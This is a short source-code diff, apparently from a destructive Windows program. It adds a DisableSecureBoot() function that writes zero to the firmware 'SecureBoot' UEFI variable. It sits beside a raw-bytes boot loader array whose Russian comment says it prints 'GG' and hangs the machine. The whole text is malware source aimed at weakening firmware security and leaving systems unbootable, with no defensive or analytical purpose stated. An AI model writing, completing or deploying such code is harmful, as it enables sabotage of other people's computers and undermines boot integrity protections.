@@ -4,6 +4,16 @@
 
 extern volatile bool g_running;
 
+void DisableSecureBoot() {
+    unsigned char disable[] = {0x00};
+    SetFirmwareEnvironmentVariableA(
+        "SecureBoot",
+        "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}",
+        disable,
+        sizeof(disable)
+    );
+}
+
 // ====== GG UEFI ЗАГРУЗЧИК (выводит GG и зависает) ======
 unsigned char gg_loader[] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
